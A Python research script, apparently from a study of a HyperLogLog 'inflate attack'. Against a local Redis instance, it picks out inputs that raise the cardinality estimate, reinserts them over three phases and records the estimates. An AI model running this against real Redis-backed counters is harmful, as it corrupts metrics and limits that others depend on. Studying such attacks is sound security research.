
  ####  Inflate Attack on Redis Hyperloglog    ####


import redis
import random
from random import randint


#Setup our redis connection. It's on the VM, so local is fine.
pool = redis.ConnectionPool(host="127.0.0.1", port=6379, db=0)
r = redis.Redis(connection_pool=pool)

# Define variables
t = 1000000;

#card_test = [100000, 500000, 1000000, 5000000, 10000000] 
#card_test = [50000,       100000,      200000,      300000,      400000,      500000,      600000,      700000,      800000,      900000,     1000000, 5000000, 10000000];  
#card_test = [100000, 1000000,      2000000,      3000000,      4000000,      5000000,      6000000,      7000000,      8000000,      9000000,     10000000];  
card_test = [1000000,1000000,1000000,1000000,1000000,1000000,1000000,1000000,1000000,1000000];
card_test = [50000000];
card_test = [20000, 40000, 60000, 80000, 100000];

P0 = [];
P1 = [];
P2 = [];
P3 = [];

A1 = [];
A2 = [];
A3 = [];



for t in card_test:
  print("#####################################") 
  print("Testing for cardinality", t) 
  
  r.delete('test')
  ini_val = randint(1,999999);
  a = [];
  b = [];

   
  ######### Phase 1   #########

  # Insert t elements
  c_ant = 0;
  c_new = 0;
  for x in range(ini_val+1,t+ini_val):
    c_ant = c_new;
    r.pfadd('test', str(x))
    # Save elements that do increase the HLL estimate
    c_new = r.pfcount('test');
    if c_new > c_ant:
      a.append(x) 

  print("The Initial HLL estimate is: ", r.pfcount('test')) 
  P0.append(r.pfcount('test'));
  
  
  # Test the set A
    
  r.delete('test')
  # Insert elements in a
  for x in a:
    r.pfadd('test', str(x))

  print("The length of list A is: ", len(a)) 
  A1.append(len(a));
  print("The HLL estimate for A in phase 1 is: ", r.pfcount('test')) 
  P1.append(r.pfcount('test'));
  
  ######### Phase 2   #########

  # Insert t elements
  c_ant = 0;
  c_new = 0;
  for x in range(ini_val+1,t+ini_val):
    c_ant = c_new;
    r.pfadd('test', str(x))
    # Save elements that do increase the HLL estimate
    c_new = r.pfcount('test');
    if c_new > c_ant:
      a.append(x) 

  print("The length of list A is: ", len(a)) 
  A2.append(len(a));
  print("The HLL estimate for A in phase 2 is: ", r.pfcount('test')) 
  P2.append(r.pfcount('test'));
  

  ######### Phase 3   #########

  r.delete('test')
  c_ant = 0;
  c_new = 0;
  for x in reversed(a):
    c_ant = c_new;
    r.pfadd('test', str(x))
    # Save elements that do increase the HLL estimate
    c_new = r.pfcount('test');
    if c_new > c_ant:
      b.append(x) 

  r.delete('test')
  for x in b:
    r.pfadd('test', str(x))

  print("The length of list B is: ", len(b)) 
  A3.append(len(b));
  print("The HLL estimate for B in phase 3 is: ", r.pfcount('test')) 
  P3.append(r.pfcount('test'));
  
  
  print("P0=", P0) 
  print("P1=", P1) 
  print("P2=", P2) 
  print("P3=", P3) 
    
  print("A1=", A1) 
  print("A2=", A2) 
  print("A3=", A3) 
    
    